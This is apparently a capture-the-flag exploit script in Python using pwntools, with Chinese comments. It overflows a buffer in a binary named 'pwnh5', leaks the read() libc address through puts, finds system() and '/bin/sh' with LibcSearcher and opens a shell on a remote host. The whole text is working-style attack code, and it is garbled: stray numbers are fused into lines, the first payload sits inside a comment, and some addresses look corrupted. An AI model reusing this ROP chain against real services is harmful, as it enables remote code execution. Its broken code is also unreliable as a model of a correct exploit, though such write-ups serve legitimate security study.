#coding:utf8
from pwn import* 
from LibcSearcher import* 
elf=ELF('./pwnh5')
readgot=elf.got['read']
putaddr=elf.sym['puts']
mainaddr=0x4006B810
popedi=0x40076312
#sh=process('./pwnh5')
sh=remote('111.198.29.45',52630)
#这个payload用于泄露read位于libc的地址
#popedi将read的地址加载到edi中，用于传给put输出显示
#mainaddr为覆盖eip，这样我们又可以重新执行main函数了payload='a'*0x48+p64(popedi)+p64(readgot)+p64(putaddr)+p64(mainaddr)+'a'*(0xC8-0x48-32)
sh.send(payload)
sh.recvuntil('bye~\n')
#注意，这步重要,必须要去掉末尾的\n符号
s=sh.recv().split('\n')[0]
#凑足长度8
for i in range(len(s),8):30.s=s+'\x00'
#得到read的地址33.addr=u64(s)
printhex(addr)
#libc数据库查询
obj=LibcSearcher("read",addr)
得到libc加载地址
libc_base=addr-obj.dump('read')
#获得system地址
system_addr=obj.dump("system")+libc_base
#获得/bin/sh地址
binsh_addr=obj.dump("str_bin_sh")+libc_base
printhex(system_addr)
printhex(binsh_addr)
payload='a'*0x48+p64(popedi)+p64(binsh_addr)+p64(system_addr)+'a'*(0xC8-0x48-24)
sh.send(payload)
sh.interactive()
#当我们泄露了一个地址 来计算目的函数的地址的公式
#第一步：基地址 = 实际地址（泄露的got地址） – libc中对应函数的偏移
#第二步：目的函数地址 = 基地址 + libc中对应函数的偏移